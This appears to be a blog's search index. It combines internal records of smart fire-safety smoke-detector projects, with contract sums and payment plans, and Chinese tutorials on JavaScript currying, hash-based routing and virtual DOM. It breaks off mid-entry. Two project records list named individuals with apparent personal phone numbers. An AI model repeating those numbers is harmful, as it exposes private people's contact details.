<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>南水镇NB-IOT智慧消防</title>
      <link href="/2020/03/31/%E5%8D%97%E6%B0%B4%E9%95%87NB-IOT%E6%99%BA%E6%85%A7%E6%B6%88%E9%98%B2/"/>
      <url>/2020/03/31/%E5%8D%97%E6%B0%B4%E9%95%87NB-IOT%E6%99%BA%E6%85%A7%E6%B6%88%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="项目内容"><a href="#项目内容" class="headerlink" title="项目内容"></a>项目内容</h3><blockquote><p>一、项目背景<br>为贯彻落实《中共中央办公厅、国务院办公厅印发〈关于推进城市安全发展的意见〉的通知》精神，珠海市南水镇南水社区居民委员会针对辖区内“五小场所”、“三小场所”积极履行规范整治责任，加强消防管理，确保场所消防安全。通过先进的物联网卡技术来实现快速消防响应，更智能高效的监控管理，保障人民群众的生命财产安全。经过客户经理的公关和努力，通过物联网卡和移动云为抓手，为客户提供NB-IOT智慧消防应用系统综合服务和移动云产品。<br>二、项目需求<br>为客户提供基于NB-IoT的独立烟感的智慧消防综合服务，通过在南水镇“三小”及有需要部署烟感监控的场所，安装NB-IOT无线烟感探测器实现集NB-IoT无线烟感监控、移动物联网、云平台、APP于一体的高效消防监控模式。NB-IOT无线烟感探测器实时监控场所内的消防安全隐患，当发生警情时，通过NB-IOT无线烟感监控系统向业主和消防监督管理部门发出告警，以便快速响应，为业主和消防监督管理部门提供一个动态掌控场所消防安全状况的智能化联网报警平台。</p></blockquote><h3 id="项目规模"><a href="#项目规模" class="headerlink" title="项目规模"></a>项目规模</h3><blockquote><p>20.0万</p></blockquote><h3 id="拓展室负责人"><a href="#拓展室负责人" class="headerlink" title="拓展室负责人"></a>拓展室负责人</h3><blockquote><p>陈宇宾</p></blockquote><h3 id="项目状态"><a href="#项目状态" class="headerlink" title="项目状态"></a>项目状态</h3><blockquote><p>转售中</p></blockquote><h3 id="合同金额"><a href="#合同金额" class="headerlink" title="合同金额"></a>合同金额</h3><blockquote><p>20万，CT： 17万</p></blockquote><h3 id="客户合同签订时间"><a href="#客户合同签订时间" class="headerlink" title="客户合同签订时间"></a>客户合同签订时间</h3><blockquote><p>2019-03-26</p></blockquote><h3 id="客户合同交付期"><a href="#客户合同交付期" class="headerlink" title="客户合同交付期"></a>客户合同交付期</h3><blockquote><p>2019-12-31</p></blockquote><h3 id="项目完工期"><a href="#项目完工期" class="headerlink" title="项目完工期"></a>项目完工期</h3><blockquote><p>2019-12-30</p></blockquote><h3 id="实施进度"><a href="#实施进度" class="headerlink" title="实施进度"></a>实施进度</h3><blockquote><p>已完成</p></blockquote><h3 id="合作商"><a href="#合作商" class="headerlink" title="合作商"></a>合作商</h3><blockquote><p>珠海迈科智能科技股份有限公司</p></blockquote><h3 id="维保期限"><a href="#维保期限" class="headerlink" title="维保期限"></a>维保期限</h3><blockquote><p>3年， 2022-03-31</p></blockquote><h3 id="付款计划"><a href="#付款计划" class="headerlink" title="付款计划"></a>付款计划</h3><blockquote><p>113335.2， 2020-05-15<br>26584.8， 2022-07-15</p></blockquote><h3 id="最新进展"><a href="#最新进展" class="headerlink" title="最新进展"></a>最新进展</h3><blockquote><p>无</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DICT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DICT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中潮科技智慧消防</title>
      <link href="/2020/03/31/%E4%B8%AD%E6%BD%AE%E7%A7%91%E6%8A%80%E6%99%BA%E6%85%A7%E6%B6%88%E9%98%B2/"/>
      <url>/2020/03/31/%E4%B8%AD%E6%BD%AE%E7%A7%91%E6%8A%80%E6%99%BA%E6%85%A7%E6%B6%88%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="项目内容"><a href="#项目内容" class="headerlink" title="项目内容"></a>项目内容</h3><blockquote><p>提供900套NB-IOT烟感火灾探测报警服务</p></blockquote><h3 id="项目规模"><a href="#项目规模" class="headerlink" title="项目规模"></a>项目规模</h3><blockquote><p>25.2万</p></blockquote><h3 id="拓展室负责人"><a href="#拓展室负责人" class="headerlink" title="拓展室负责人"></a>拓展室负责人</h3><blockquote><p>赵国明： 13823024333</p></blockquote><h3 id="项目状态"><a href="#项目状态" class="headerlink" title="项目状态"></a>项目状态</h3><blockquote><p>转售中</p></blockquote><h3 id="合同金额"><a href="#合同金额" class="headerlink" title="合同金额"></a>合同金额</h3><blockquote><p>总金额：252000， CT：231300， ICT收入：252000</p></blockquote><h3 id="客户合同签订时间"><a href="#客户合同签订时间" class="headerlink" title="客户合同签订时间"></a>客户合同签订时间</h3><blockquote><p>2020-02-10</p></blockquote><h3 id="客户合同交付期"><a href="#客户合同交付期" class="headerlink" title="客户合同交付期"></a>客户合同交付期</h3><blockquote><p>2020-02-07</p></blockquote><h3 id="项目完工期"><a href="#项目完工期" class="headerlink" title="项目完工期"></a>项目完工期</h3><blockquote><p>2020-02-05</p></blockquote><h3 id="实施进度"><a href="#实施进度" class="headerlink" title="实施进度"></a>实施进度</h3><blockquote><p>已完成</p></blockquote><h3 id="合作商"><a href="#合作商" class="headerlink" title="合作商"></a>合作商</h3><blockquote><p>广东潮庭集团有限公司 洪创波 13825651111</p></blockquote><h3 id="维保期限"><a href="#维保期限" class="headerlink" title="维保期限"></a>维保期限</h3><blockquote><p>一年 2021-01-09</p></blockquote><h3 id="付款计划"><a href="#付款计划" class="headerlink" title="付款计划"></a>付款计划</h3><blockquote><ol><li>金额：115650 时间：2020-04-15</li><li>金额：104085 时间：2020-05-15</li><li>金额：11565 时间：2021-04-15</li></ol></blockquote><h3 id="最新进展"><a href="#最新进展" class="headerlink" title="最新进展"></a>最新进展</h3><blockquote><p>已做4月份预提，等待付款</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DICT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DICT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java锁定义与机制</title>
      <link href="/2019/03/05/java%E9%94%81%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%9C%BA%E5%88%B6/"/>
      <url>/2019/03/05/java%E9%94%81%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="一，由ReentrantLock和synchronized实现的一系列锁"><a href="#一，由ReentrantLock和synchronized实现的一系列锁" class="headerlink" title="一，由ReentrantLock和synchronized实现的一系列锁"></a>一，由ReentrantLock和synchronized实现的一系列锁</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js柯里化</title>
      <link href="/2018/10/21/js%E6%9F%AF%E9%87%8C%E5%8C%96/"/>
      <url>/2018/10/21/js%E6%9F%AF%E9%87%8C%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<blockquote><p>柯里化是指将使用多个参数的函数转换成一系列使用一个参数的该函数的技术</p></blockquote><p>柯里化的用途主要是 <strong>参数服用</strong> , 例如:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> add(a,b) &#123;<br>  <span class="hljs-built_in">return</span> a + b;<br>&#125;<br>add(1,2)<br></code></pre></td></tr></table></figure></p><p>在柯里化后或许可以这样使用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">var addCurry = curry(add);<br>addCurry(1)(2);<br></code></pre></td></tr></table></figure></p><p>或许针对这种简单的将两个数相加的场景，柯里化显得有点多余。但是如果我们想使用这个函数完成通用的事情，比如为所有的数加5，就可以使用addCurry(5)(x)，使得将两个数相加的函数有了通用性。</p><h2 id="柯里化的实现"><a href="#柯里化的实现" class="headerlink" title="柯里化的实现"></a>柯里化的实现</h2><h3 id="通用版本"><a href="#通用版本" class="headerlink" title="通用版本"></a>通用版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">var curry = <span class="hljs-keyword">function</span>(func)&#123;<br>  var args = [].slice.call(arguments,1);<br>  <span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    var newArgs = args.concat([].slice.call(arguments));<br>    <span class="hljs-built_in">return</span> func.apply(this,newArgs);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先将参数进行分割，也就是将除了func之外的参数存进args。</li><li>返回的函数接受新传入的参数并与之前的参数合并，从而将所有的参数传入函数中，并执行真正的函数。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> add(a,b) &#123;<br>  <span class="hljs-built_in">return</span> a+b;<br>&#125;<br>//或<br>var addCurry = curry(add,1,2);<br>addCurry(); // 3<br>//或<br>var addCurry = curry(add,1);<br>addCurry(2); // 3<br>//或<br>var addCurry = curry(add);<br>addCurry(1,2); //3<br></code></pre></td></tr></table></figure><p>已经有柯里化的感觉了，但是还没有达到要求，即此柯里化之后的函数只能被调用一次，不能实现addCurry(1)(2)这样的操作。<br>我们继续进行改进。</p><h3 id="改进版"><a href="#改进版" class="headerlink" title="改进版"></a>改进版</h3><p>比如说add这个函数接受两个参数，那么针对柯里化之后的函数，若传入的参数没有到达两个的话，就继续调用curry，继续接受参数。若参数到达2个了，就直接调用add函数。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">var curry = <span class="hljs-keyword">function</span>(func, args) &#123;<br>  var length =  func.length;<br>  args = args || [];<br>  <span class="hljs-built_in">return</span> <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    newArgs = args.concat([].slice.call(arguments));<br>    <span class="hljs-keyword">if</span>(newArgs.length &lt; length) &#123;<br>      <span class="hljs-built_in">return</span> curry.call(this, func, newArgs);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">return</span> func.apply(this, newArgs);<br>    &#125;<br>  &#125;<br>&#125;<br><br>var addCurry = curry(add);<br>addCurry(1,2); //3<br>addCurry(1)(2); //3<br></code></pre></td></tr></table></figure></p><h2 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h2><p>但这一版柯里化函数仍然不能完全满足要求，因为他只针对有特定参数个数的函数使用。<br>关于柯里化的面试题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined">实现一个add方法，使计算结果满足如下预期<br>add(1)(2)(3) = 6<br>add(1,2,3)(4) = 10<br>add(1)(2)(3)(4)(5) = 15<br></code></pre></td></tr></table></figure></p><p>我们之前写的柯里化是不能满足这个需求的，因为传入的参数个数是不固定的。<br>其实这里的需求是我们在柯里化的过程中既能返回一个函数继续接受剩下的参数，又能就此输出当前的一个结果。</p><p>这里就需要使用函数的toString来完成。<br>当我们返回函数的时候，会调用函数的toString来完成隐式转换，这样输出的就不是函数的字符串形式而是我们定义的toString返回的值。这样就既可以保持返回一个函数，又能够得到一个特定的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">add</span></span>()&#123;<br>  var args = [].slice.call(arguments);<br>  var fn = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>    var newArgs = args.concat([].slice.call(arguments));<br>    <span class="hljs-built_in">return</span> add.apply(null,newArgs);<br>  &#125;<br>  fn.toString = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    <span class="hljs-built_in">return</span> args.reduce(<span class="hljs-keyword">function</span>(a,b) &#123;<br>      <span class="hljs-built_in">return</span> a + b;<br>    &#125;)<br>  &#125;<br>  <span class="hljs-built_in">return</span> fn;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js实现前端路由</title>
      <link href="/2018/10/03/js%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1/"/>
      <url>/2018/10/03/js%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<p>路由就是根据不同的 url 地址展示不同的内容或页面，早期路由的概念是在后端出现的，通过服务器端渲染后返回页面，随着页面越来越复杂，服务器端压力越来越大。后来ajax异步刷新的出现使得前端也可以对url进行管理，此时，前端路由就出现了。单页面就是有前端路由来实现的，也就是说网站只有一个页面，点击导航会显示不同的内容，对应的url也在发生改变。在这个过程中，js会实时检测url的变化，从而改变显示的内容。</p><h2 id="路由实现原理："><a href="#路由实现原理：" class="headerlink" title="路由实现原理："></a>路由实现原理：</h2><p>window绑定了监听函数，当url的hash值发生变化的时候会触发hashchange回调，在回调中进行不同的操作，马上刷新页面，从而显示不同的页面。</p><p>下面是一个前端路由的简单实现：通过路由实现url的切换、页面内容的改变。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">"en"</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;<br>    &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">"X-UA-Compatible"</span> content=<span class="hljs-string">"ie=edge"</span>&gt;<br>    &lt;title&gt;前端路由测试&lt;/title&gt;<br>    &lt;script src=<span class="hljs-string">"../plugins/jQuery/jquery-1.12.4.min.js"</span>&gt;&lt;/script&gt;<br> <br>    &lt;style&gt;<br>        .content &#123;<br>            width: 50px;<br>            height: 50px;<br>            background-color: <span class="hljs-comment">#00a2d4;</span><br>        &#125;<br>    &lt;/style&gt;<br> <br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;ul&gt;<br>    &lt;li&gt;&lt;a href=<span class="hljs-string">"#/red"</span>&gt;turn red&lt;/a&gt;&lt;/li&gt;<br>    &lt;li&gt;&lt;a href=<span class="hljs-string">"#/blue"</span>&gt;turn blue&lt;/a&gt;&lt;/li&gt;<br>    &lt;li&gt;&lt;a href=<span class="hljs-string">"#/green"</span>&gt;turn green&lt;/a&gt;&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;div class=<span class="hljs-string">"content"</span>&gt;<br>&lt;/div&gt;<br> <br>&lt;script src=<span class="hljs-string">"router.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"test.js"</span>&gt;&lt;/script&gt;<br> <br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造函数<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">Router</span></span>() &#123;<br>    this.routes = &#123;&#125;;<br>    this.currentUrl = <span class="hljs-string">''</span>;<br>&#125;<br>Router.prototype.route = <span class="hljs-keyword">function</span>(path, callback) &#123;<br>    this.routes[path] = callback || <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;&#125;;//给不同的<span class="hljs-built_in">hash</span>设置不同的回调函数<br>&#125;;<br>Router.prototype.refresh = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    console.log(location.hash.slice(1));//获取到相应的<span class="hljs-built_in">hash</span>值<br>    this.currentUrl = location.hash.slice(1) || <span class="hljs-string">'/'</span>;//如果存在<span class="hljs-built_in">hash</span>值则获取到，否则设置<span class="hljs-built_in">hash</span>值为/<br>    // console.log(this.currentUrl);<br>    <span class="hljs-keyword">if</span>(this.currentUrl&amp;&amp;this.currentUrl!=<span class="hljs-string">'/'</span>)&#123;<br>        this.routes[this.currentUrl]();//根据当前的<span class="hljs-built_in">hash</span>值来调用相对应的回调函数<br>    &#125;<br> <br>&#125;;<br>Router.prototype.init = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    window.addEventListener(<span class="hljs-string">'load'</span>, this.refresh.bind(this), <span class="hljs-literal">false</span>);<br>    window.addEventListener(<span class="hljs-string">'hashchange'</span>, this.refresh.bind(this), <span class="hljs-literal">false</span>);<br>&#125;<br>//给window对象挂载属性<br>window.Router = new Router();<br>window.Router.init();<br></code></pre></td></tr></table></figure><p>test.js<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Router.route(<span class="hljs-string">'/red'</span>, <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    $(<span class="hljs-string">".content"</span>).css(<span class="hljs-string">'background-color'</span>,<span class="hljs-string">'red'</span>)<br>&#125;);<br>Router.route(<span class="hljs-string">'/blue'</span>, <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    $(<span class="hljs-string">".content"</span>).css(<span class="hljs-string">'background-color'</span>,<span class="hljs-string">'blue'</span>)<br>&#125;);<br>Router.route(<span class="hljs-string">'/green'</span>, <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    $(<span class="hljs-string">".content"</span>).css(<span class="hljs-string">'background-color'</span>,<span class="hljs-string">'green'</span>)<br>&#125;);<br></code></pre></td></tr></table></figure></p><p>上面router对象实现主要提供了三个方法</p><p>1.init监听浏览器url的hash值更新事件。</p><p>2.route存储路由更新时的回调到回调数组routes中，回掉函数将负责对页面进行更新。</p><h2 id="3-refresh执行当前url的回调函数，更新页面。"><a href="#3-refresh执行当前url的回调函数，更新页面。" class="headerlink" title="3.refresh执行当前url的回调函数，更新页面。"></a>3.refresh执行当前url的回调函数，更新页面。</h2><p>本文来自 二萌偏 的CSDN 博客 ，全文地址请点击：<a href="https://blog.csdn.net/weixin_39735923/article/details/80386690?utm_source=copy" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39735923/article/details/80386690?utm_source=copy</a> </p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟dom实现</title>
      <link href="/2018/09/29/%E8%99%9A%E6%8B%9Fdom%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/09/29/%E8%99%9A%E6%8B%9Fdom%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>vdom是vue和React的核心。</p><p>vdom是什么？为何会存在vdom?<br>    vdom如何应用，核心API是什么</p><h1 id="vdom是什么？"><a href="#vdom是什么？" class="headerlink" title="vdom是什么？"></a>vdom是什么？</h1><p>虚拟DOM，用JS模拟DOM结构。DOM变化的对比，放在JS层来做（图灵完备语言）。提高重绘性能。</p><h2 id="什么是图灵完备语言？"><a href="#什么是图灵完备语言？" class="headerlink" title="什么是图灵完备语言？"></a>什么是图灵完备语言？</h2><p>就是可以实现逻辑、判断、算法的语言。</p><h2 id="什么是vdom"><a href="#什么是vdom" class="headerlink" title="什么是vdom?"></a>什么是vdom?</h2><p>这是一个真实的DOM</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;ul id=<span class="hljs-string">"list"</span>&gt;<br>    &lt;li class=<span class="hljs-string">"item"</span>&gt;Item 1&lt;/li&gt;<br>    &lt;li class=<span class="hljs-string">"item"</span>&gt;Item 2&lt;/li&gt;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure><p>用js模拟上面的dom如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">  &#123;<br>    tag: <span class="hljs-string">'ul'</span>,<br>    attrs: &#123;<br>        id: <span class="hljs-string">'list'</span><br>    &#125;,<br>    children: [<br>        &#123;<br>            tag: <span class="hljs-string">'li'</span>,<br>            attrs: &#123;className: <span class="hljs-string">'item'</span>&#125;,      //class是JS保留字，所以这里使用className<br>            children: [<span class="hljs-string">'Item 1'</span>]<br>        &#125;,&#123;<br>            tag: <span class="hljs-string">'li'</span>,<br>            attrs: &#123;className: <span class="hljs-string">'item'</span>&#125;,<br>            children: [<span class="hljs-string">'Item 2'</span>]<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></p><p>假设DOM发生了变化，我们在真实的DOM结构中，我们要进行DOM操作。而在虚拟的DOM结构中，我们只需要修改不一样的地方即可。为什么这样做，因为浏览器在进行DOM操作的时候消耗很大，而进行JS操作，操作很多次也没什么关系。DOM操作是最昂贵的，现在浏览器执行JS速度非常快。所以说用虚拟DOM。</p><h2 id="设计场景（为什么会存在vdom）"><a href="#设计场景（为什么会存在vdom）" class="headerlink" title="设计场景（为什么会存在vdom）"></a>设计场景（为什么会存在vdom）</h2><p>将数据展示成一个表格。随便修改一个信息，表格也跟着修改。数据如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<br>    &#123;<br>        name: <span class="hljs-string">'张三'</span>,<br>        age: <span class="hljs-string">'20'</span>,<br>        address: <span class="hljs-string">'北京'</span><br>    &#125;,<br>    &#123;<br>        name: <span class="hljs-string">'李四'</span>,<br>        age: <span class="hljs-string">'21'</span>,<br>        address: <span class="hljs-string">'上海'</span><br>    &#125;,<br>    &#123;<br>        name: <span class="hljs-string">'王五'</span>,<br>        age: <span class="hljs-string">'22'</span>,<br>        address: <span class="hljs-string">'广州'</span><br>    &#125;<br>]<br></code></pre></td></tr></table></figure></p><h3 id="1-JQuery实现"><a href="#1-JQuery实现" class="headerlink" title="1,JQuery实现"></a>1,JQuery实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">"en"</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>    &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span> src=<span class="hljs-string">"./jquery-1.12.4.min.js"</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div id=<span class="hljs-string">"container"</span>&gt;&lt;/div&gt;<br>    &lt;button id=<span class="hljs-string">"btn-change"</span>&gt;change&lt;/button&gt;<br>    &lt;script&gt;<br>        var data = [<br>            &#123;<br>                name: <span class="hljs-string">'张三'</span>,<br>                age: <span class="hljs-string">'20'</span>,<br>                address: <span class="hljs-string">'北京'</span><br>            &#125;,<br>            &#123;<br>                name: <span class="hljs-string">'李四'</span>,<br>                age: <span class="hljs-string">'21'</span>,<br>                address: <span class="hljs-string">'上海'</span><br>            &#125;,<br>            &#123;<br>                name: <span class="hljs-string">'王五'</span>,<br>                age: <span class="hljs-string">'22'</span>,<br>                address: <span class="hljs-string">'广州'</span><br>            &#125;<br>        ]<br> <br>        <span class="hljs-keyword">function</span> render(data) &#123;<br>            var <span class="hljs-variable">$container</span> = $(<span class="hljs-string">'#container'</span>)<br>            <span class="hljs-variable">$container</span>.html(<span class="hljs-string">''</span>)<br>            var <span class="hljs-variable">$table</span> = $(<span class="hljs-string">'&lt;table&gt;'</span>)<br>            <span class="hljs-variable">$table</span>.append($(<span class="hljs-string">'&lt;tr&gt;&lt;td&gt;name&lt;/td&gt;&lt;td&gt;age&lt;/td&gt;&lt;td&gt;address&lt;/td&gt;&lt;/tr&gt;'</span>))<br>            data.forEach(<span class="hljs-keyword">function</span>(item)&#123;<br>                <span class="hljs-variable">$table</span>.append($(<span class="hljs-string">'&lt;tr&gt;&lt;td&gt;'</span>+ item.name +<span class="hljs-string">'&lt;/td&gt;&lt;td&gt;'</span> + item.age + <span class="hljs-string">'&lt;/td&gt;&lt;td&gt;'</span> + item.address + <span class="hljs-string">'&lt;/td&gt;&lt;/tr&gt;'</span>))<br>            &#125;)<br>            //渲染到页面<br>            <span class="hljs-variable">$container</span>.append(<span class="hljs-variable">$table</span>)<br>        &#125;<br> <br>        $(<span class="hljs-string">'#btn-change'</span>).click(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>            data[1].age = 30<br>            data[2].address = <span class="hljs-string">'深圳'</span><br>            render(data)<br>        &#125;)<br> <br>        render(data)<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="2-snabbdom实现"><a href="#2-snabbdom实现" class="headerlink" title="2,snabbdom实现"></a>2,snabbdom实现</h3><p><img src="https://img-blog.csdn.net/20180831213914288?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5naHVhbGkwMjEw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" 